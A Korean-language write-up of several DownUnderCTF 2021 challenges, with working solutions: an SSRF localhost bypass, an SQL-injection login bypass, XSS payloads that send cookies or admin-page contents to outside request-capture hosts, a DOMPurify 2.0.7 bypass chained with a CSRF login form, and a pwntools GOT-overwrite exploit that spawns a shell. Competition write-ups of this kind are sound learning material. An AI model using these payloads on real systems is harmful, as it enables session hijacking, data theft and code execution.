## Summary

![image](https://user-images.githubusercontent.com/49112423/134801931-ef6a186b-f2d6-4f7c-b496-dda713319576.png)

오랜만에 버그바운티가 아닌 CTF를 독고다이로 참가 했는데, 해킹 공부를 약 2 ~ 3달 동안 안 해서 감도 안 잡혀서, 그냥 넷플 보다가 풀다가 무한 반복 했습니다.

---
## Web Challenge

### Inside Out [100 pts]

> Inside Out 문제는 SSRF를 이용해 플래그를 획득하는 문제 입니다.

![image](https://user-images.githubusercontent.com/49112423/134766820-f6664887-434f-44b2-b3d5-435e650f8238.png)

문제로 들어오면 위와 같이 환영 한다고 인사를 해주며 밑에 `Proxy Example`라는 링크가 있는 것을 볼 수 있습니다.

![image](https://user-images.githubusercontent.com/49112423/134766872-9b50f80e-2861-4c2f-81fd-de37c1b82855.png)

위 링크를 클릭 해 접속을 하면 위와 같이 `url` 파라미터를 이용해서 요청 한 후에 응답 값을 가져오는 것을 볼 수 있고, 여기서 SSRF를 이용해서 플래그를 획득 해야 합니다.

![image](https://user-images.githubusercontent.com/49112423/134766915-80c828de-115c-4fec-b9c6-9a66fed48d1c.png)

```
http://0.0.0.0
```
대부분에 로컬 호스트는 필터링에 걸려 있어 위 페이로드를 이용해서 우회를 시도 하였고, 응답 값 내에 관리자 패널이 존재하는 것을 알 수 있습니다.

![image](https://user-images.githubusercontent.com/49112423/134766954-091f47f1-9859-4976-be87-644b820cee9c.png)

그래서 /admin으로 SSRF 해주면 플래그를 획득할 수 있습니다.

```
DUCTF{very_spooky_request}
```

---
### Cowboy World [100 pts]

> Cowboy World 문제는 SQL Injection을 이용한 인증 우회를 이용해 플래그를 획득하는 문제 입니다.

![image](https://user-images.githubusercontent.com/49112423/134767015-a3e3feca-0ec8-45ca-bac5-bf0d6a9f9a25.png)

문제로 들어오면 위와 같이 로그인 로직이 존재하는 것을 볼 수 있습니다. 하지만 username/password의 값으로 SQL Injection 페이로드를 삽입 해주어도 공격이 되지 않아 올바른 username을 찾아야 한다고 생각했습니다.

```
# pls no look

User-Agent: regular_cowboys
Disallow: /sad.eml
```
```
Everyone says 'yeee hawwwww'

but never 'hawwwww yeee'

:'(

thats why a 'sadcowboy' is only allowed to go into our website
```

그래서 정보 수집을 하기 위해서 `/robots.txt`로 접속을 해보니 메일 파일이 있었고, 메일 내용으로 위와 같이 있었습니다. 그래서 그냥 username으로 `sadcowboy`를 넘겨주고 password 값으로 `'or 1=1 --` 해주니 해결 되었습니다.

```
DUCTF{haww_yeeee_downunderctf?}
```

---
### x1337 Sk1d R3p0rt3r [232 pts]

> x1337 Sk1d R3p0rt3r 문제는 구문 분석에 의한 XSS를 이용해서 플래그를 획득하는 문제 입니다. 귀찮아서 gist에 올린 거 그대도 올립니다.

```
poc-1. </script>
poc-2. <script>`
```

```
1. Go to https://web-x1337-sk1d-r3p0rt3r-9cfd1dc4.chal-2021.duc.tf/.
2. login after register your personal account.
3. Edit the username to poc-1 and report to any value.
4. Edit the username to poc-2 and report to "`;fetch(`http://requestbin/?c=`+document.cookie)//".
5. Finally, edit the username to poc-1 and report to any value.
6. Then we can successfully hijack the admin session
```
![](https://user-images.githubusercontent.com/49112423/134772882-3cfe5698-ea5f-46ec-b48c-28d1e2668f00.png)

```
DUCTF{xxX_x55_4_1337_h4x0rz_Xxx}
```

---
### Notepad [473 pts]

> Notepad 문제는 CSRF + XSS를 체이닝 해서 플래그를 획득하는 문제 입니다. 개인적으로 매우 쉬웠는데 솔브가 왜 적은 지 이해가 안 됨.

소스 코드가 제공 됨으로 플래그 획득 조건을 확인 해보겠습니다.

```python
@app.route('/admin')
async def admin():
    if quart.session.get('admin') != 1:
        return "", 403
    return open('flag.txt').read()

@app.route('/report', methods=["GET", "POST"])
@quart_rate_limiter.rate_limit(5, dt.timedelta(seconds=10))
async def report():
    user = quart.session.get('user')
    if not user:
        return quart.redirect(quart.url_for('index'))
    if quart.session.get('admin') == 1:
        # Just in case anyone tries it
        return "You're the admin... Go fix it yourself", 418

    if quart.request.method == 'POST':
        form = await quart.request.form
        url = form.get('url')
        if url:
            __stub_get_url(url)
            return quart.redirect(quart.url_for('me'))

    return await quart.render_template('report.html')

@app.route('/__stub/admin/login')
async def __stub_admin_login():
    quart.session['admin'] = 1
    return "Ok"
```
플래그 획득 조건을 보면 `/admin`으로 요청한 사용자가 관리자 권한을 가지고 있어야 합니다.

![image](https://user-images.githubusercontent.com/49112423/134767183-1628a4a0-90b4-4a2b-bccb-4a6db0b0cb9c.png)

회원 가입 후 로그인을 해주니 노트 패드 로직이 존재하는 것을 확인할 수 있습니다.

```js
    (function() {
        const converter = new showdown.Converter();
        const tabs = Array.from(document.querySelectorAll('.tabs > a'));
        const views = Array.from(document.querySelectorAll('[data-view]'));
        const noteForm = document.querySelector('#note-form');
        const markdown = document.querySelector('#markdown');
        const editor = document.querySelector('#editor');

        tabs.forEach(tab => {
            tab.addEventListener('click', () => {
                tabs.forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                views.forEach(v => v.classList.add('is-hidden'));
                const view = tab.getAttribute('data-view-trigger');
                document.querySelector(`[data-view="${view}"]`)?.classList.remove('is-hidden');

                if(view === 'view') {
                    markdown.innerHTML = DOMPurify.sanitize(converter.makeHtml(editor.value));
                }
            })
        });

        noteForm.addEventListener('submit', e => {
            e.preventDefault();
            e.stopImmediatePropagation();

            fetch('/me', {
                method: 'POST',
                credentials: 'include',
                headers: {'content-type': 'application/json'},
                body: JSON.stringify({note: editor.value})
            }).then(r => alert('Saved!'));
        });

        markdown.innerHTML = DOMPurify.sanitize(converter.makeHtml(editor.value));
    })();
```
코드를 확인 해보면 입력값을 받고, 마크 다운으로 처리 한 후에 sanitize 시켜주는 것을 볼 수 있습니다. 하지만 입력값은 마크 다운만 사용할 수 있게 정규식이 걸려 있는 것이 아니고, 일반 TEXT도 사용할 수 있는 것을 확인할 수 있습니다. 

![image](https://user-images.githubusercontent.com/49112423/134767228-2901c65c-e903-43cd-a67b-4e4261dfe20e.png)

```html
<img src=x onerror=alert(1)>
```

XSS를 트리거 하기 위해 위 POC를 저장해주니 당연히 sanitize에 의해 XSS가 제어 되고 있는 것을 확인할 수 있었습니다.

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/showdown/1.9.1/showdown.min.js" integrity="sha512-L03kznCrNOfVxOUovR6ESfCz9Gfny7gihUX/huVbQB9zjODtYpxaVtIaAkpetoiyV2eqWbvxMH9fiSv5enX7bw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js" integrity="sha512-pAsGSA54gmV3kpBZBDMk7SgP6DnYNNzj6ZFZ6//jUKOaXSSkE5sdbZMazo3u5QOofhZoGeNwo4Z4e526HPQhcg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
```
Dompurify는 2.0.7을 이용해 XSS를 대응하는 것을 확인 할 수 있었고, Dompurify Bypass Poc를 이용해서 XSS를 트리거 하기로 했습니다.

![image](https://user-images.githubusercontent.com/49112423/134767329-7625d16d-0af6-481f-b0f7-ba713d6e34bf.png)

```html
</p><form><math><mtext></form><form><mglyph><style></math><img src=x onerror="alert(1)"><p>
```

위 POC 코드를 저장해주니 Dompurify가 우회 돼 XSS가 트리거 되는 것을 확인할 수 있었고, 양 끝에 `</p>`, `<p>` 태그를 넣어준 이유는 `converter.makeHtml()`를 이용해서 마크다운을 HTML로 변환해주고 반환 해주는데, 이때 양 옆에 불 필요한 `<p>` 태그가 생겨 무효화 시켜 주기 위함 입니다.

```html
</p><form><math><mtext></form><form><mglyph><style></math><img src=x onerror="fetch('/admin').then(function(response){return/**/response.text();}).then(function(x){fetch('https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f='+x)})"><p>
```

마지막으로 위 POC 코드를 이용해서 플래그를 획득 하기로 했지만, Note 마다 고유의 번호가 존재 하지 않아 POC 코드를 저장해도 관리자가 해당 페이로드를 읽게 하는 데 무리가 있었습니다.

```python
@app.route('/login', methods=['GET', 'POST'])
async def login_():
    err = ''
    if quart.request.method == "POST":
        form = await quart.request.form
        username, password = map(form.get, ['username', 'password'])

        if username is None or password is None:
            err = "Username and password must be specified"
        elif not await login(username, password):
            err = "Invalid username or password"
        else:
            quart.session['user'] = username
            return quart.redirect(quart.url_for('me'))

    return await quart.render_template('login.html', err=err)
```
그러다가 로그인 로직을 확인 해보니 로그인을 성공하면 현재 로그인 한 사용자 세션으로 `/me`로 리다이렉션 시켜주는 것을 확인 할 수 있었습니다. 이를 이용해서 그냥 `CSRF` 해주면 됩니다.

개인 서버에 `Form` 태그를 올리고 관리자가 제 계정으로 로그인 하게 하고, 제 세션의 관리자 권한을 올려 플래그를 읽기로 했습니다.

```html
<!doctype html>
<html>
  <head>
    <title>xss poc</title>
  </head>
  <body>
        <form action="https://web-notepad-f6ed1a7d.chal-2021.duc.tf/login" method="POST" id=poc>
                <input name='username' value='pocas'>
                <input name='password' value='pocas'>
        </form>
        <script>
                poc.submit()
        </script>
  </body>
</html>
```

노트에 위 POC 코드를 저장하고, 개인 서버에는 위 POC 코드를 올린 후에 리포터 기능으로 개인 서버 URL을 전달 해주겠습니다.

![image](https://user-images.githubusercontent.com/49112423/134767511-4a5c171a-19c6-46e2-a155-049e4bfa2fc9.png)

개인 서버 URL을 전달 해주니 플래그를 획득 할 수 있었습니다.

```
DUCTF{ch4ining_c5rf_c4uses_cha0s_2045c24d}
```

---
## Misc Challenge

### General Skills Quiz [100 pts]

```python
from pwn import *
from urllib import parse
import base64
import codecs

def base64_decode(data):
    sitename_bytes = base64.b64decode(data)
    return sitename_bytes .decode('ascii')

def url_decode(data):
    return parse.unquote(data)

rot13 = lambda s : codecs.getencoder("rot-13")(s)[0]

p = remote("pwn-2021.duc.tf", 31905)
p.recv()
p.sendline()
p.recv()
p.sendline(b'2')

p.sendline(str(int(str(p.recv()).split(': ')[1].replace('\\n','').replace('\'','').replace('0x',''), 16)).encode())
p.sendline(chr(int(str(p.recv()).split(': ')[1].replace('\\n','').replace('"',''), 16)))
p.sendline(url_decode(str(p.recv()).split(': ')[1].replace('\\n','').replace('"','')).encode())
p.sendline(base64_decode(str(p.recv()).split(': ')[1].replace('\\n','').replace('"','')).encode())
p.sendline(base64.b64encode(str(p.recv()).split(': ')[1].replace('\\n','').replace('"','').encode()))
p.sendline(rot13(str(p.recv()).split(': ')[1].replace('\\n','').replace('"','')).encode())
p.sendline(codecs.encode(str(p.recv()).split(': ')[1].replace('\\n','').replace('"',''), 'rot_13').encode())
p.sendline(str(int(str(p.recv()).split(': ')[1].replace('\\n','').replace('"',''),2)).encode())
p.sendline(str(bin(int(str(p.recv()).split(': ')[1].replace('\\n','').replace('\'','')))).encode())

p.recv()
p.sendline(b'DUCTF')
print(p.recv())
```

```
DUCTF{you_aced_the_quiz!_have_a_gold_star_champion}
```

---
## Pwn Challenge

### write what where [310 pts]

```python
from pwn import *

r=remote("pwn-2021.duc.tf", 31920)
# r=process("./write-what-where")
b=ELF("./write-what-where")
context.log_level='debug'
lib=ELF("./libc.so.6")
# lib=ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
exit=0x404038
r.send(p32(b.sym['main']+33))
r.send(str(exit).rjust(9,'0'))

r.send(p32(b.plt['puts']))
r.send(str(b.got['setvbuf']).rjust(9,'0'))

r.send(p32(0))
r.send(str(b.got['setvbuf']+4).rjust(9,'0'))
r.send(p32(0x404050))
r.send(str(0x404060).rjust(9,'0'))

r.send(p32(0))
r.send(str(0x404060+4).rjust(9,'0'))
r.send(p32(b.sym['main']))  
r.send(str(exit).rjust(9,'0'))

base=u64(r.recvuntil(b'\x7f')[:-7:-1][::-1].ljust(8,b'\x00'))-lib.sym['_IO_2_1_stdout_']
log.info(hex(base))
system=base+lib.sym['system']
binsh=base+list(lib.search(b'/bin/sh'))[0]
log.info(hex(system))
r.send(p32(b.sym['main']+33))
r.send(str(exit).rjust(9,'0'))
r.send(p32(system&0xffffffff))
r.send(str(b.got['setvbuf']).rjust(9,'0'))

r.send(p32((system>>32)))
r.send(str(b.got['setvbuf']+4).rjust(9,'0'))

r.send(p32(binsh&0xffffffff))
r.send(str(0x404060).rjust(9,'0'))
r.send(p32((binsh>>32)))
r.send(str(0x404064).rjust(9,'0'))
# r.send(b'/sh\x00')
# r.send(str(0x404054).rjust(9,'0'))
# r.send(b'/sh\x00')
# r.send(str(0x404054).rjust(9,'0'))
r.send(p32(b.sym['main']))
r.send(str(exit).rjust(9,'0'))

r.interactive()
```

```
DUCTF{arb1tr4ry_wr1t3_1s_str0ng_www}
```

---
